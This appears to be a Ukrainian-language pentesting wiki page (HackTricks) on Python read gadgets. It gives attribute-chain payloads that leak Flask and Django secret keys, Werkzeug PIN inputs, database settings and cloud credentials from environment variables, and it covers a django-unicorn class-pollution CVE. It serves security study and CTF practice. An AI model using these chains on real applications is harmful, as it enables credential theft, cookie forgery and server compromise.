# Python Внутрішні Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

Різні вразливості, такі як [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) або [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), можуть дозволити вам **читати внутрішні дані Python, але не дозволять виконувати код**. Тому pentester повинен максимально використати ці права читання, щоб **отримати чутливі привілеї та ескалювати вразливість**.

### Flask - Read secret key

Головна сторінка Flask-застосунку ймовірно матиме глобальний об'єкт **`app`**, в якому цей **секрет налаштований**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
У цьому випадку доступ до цього об'єкта можна отримати, просто використавши будь-який гаджет для **отримання доступу до глобальних об'єктів** зі сторінки [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).

У випадку, коли **the vulnerability is in a different python file**, потрібен гаджет, щоб пройти через файли й дістатися до головного, щоб **отримати доступ до глобального об'єкта `app.secret_key`**, змінити Flask secret key і мати змогу [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload, подібний до цього [from this writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Використайте цей payload, щоб **змінити `app.secret_key`** (назва у вашому додатку може бути іншою) і мати змогу підписувати нові Flask cookie з більшими привілеями.

### Werkzeug - machine_id and node uuid

[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) ви зможете отримати доступ до **machine_id** та вузла **uuid**, які є **основними секретами**, необхідними для [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md), що дозволяє отримати доступ до python-консолі в `/console`, якщо **debug mode** увімкнено:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Зверніть увагу, що ви можете отримати **локальний шлях сервера до `app.py`**, спричинивши певну **помилку** на веб‑сторінці, яка **дасть вам цей шлях**.

If the vulnerability is in a different python file, check the previous Flask trick to access the objects from the main python file.

### Django - SECRET_KEY та модуль settings

Об'єкт налаштувань Django кешується в `sys.modules` після запуску застосунку. Маючи лише примітиви для читання, ви можете leak **`SECRET_KEY`**, облікові дані бази даних або солі підпису:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.DATABASES, a.SIGNING_BACKEND)
```
Якщо вразливий гаджет знаходиться в іншому модулі, спочатку пройдіть globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
Як тільки ключ відомий, ви можете підробити Django signed cookies або tokens аналогічно до Flask.

### Environment variables / cloud creds через завантажені модулі

Багато jails досі імпортують `os` або `sys` десь. Ви можете зловживати будь-якою досяжною функцією `__init__.__globals__`, щоб перейти до вже імпортованого `os` module і вивантажити **environment variables**, що містять API tokens, cloud keys або flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Якщо індекс підкласу фільтрується, використовуйте loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Змінні середовища часто є єдиними секретами, необхідними для переходу від читання до повної компрометації (cloud IAM keys, database URLs, signing keys тощо).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` (<0.62.0) allowed **class pollution** via crafted component requests. Встановлення шляху властивості, наприклад `__init__.__globals__`, дозволяло атакуючому дістатися до globals модуля компонента та будь-яких імпортованих модулів (наприклад, `settings`, `os`, `sys`). Звідти you can leak `SECRET_KEY`, `DATABASES` or service credentials без виконання коду. Ланцюг експлойту є виключно на читання і використовує ті самі dunder-gadget patterns, що й вище.

### Gadget collections for chaining

Нещодавні CTF (наприклад, jailCTF 2025) демонструють надійні read chains, побудовані лише за допомогою доступу до атрибутів та перерахування підкласів. Списки, які підтримує спільнота, такі як [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), каталогізують сотні мінімальних gadgets, які ви можете комбінувати, щоб переходити від об'єктів до `__globals__`, `sys.modules` та, нарешті, до чутливих даних. Використовуйте їх, щоб швидко адаптуватися, коли індекси або імена класів відрізняються між мінорними версіями Python.



## References

- [Wiz analysis of django-unicorn class pollution (CVE-2025-24370)](https://www.wiz.io/vulnerability-database/cve/cve-2025-24370)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
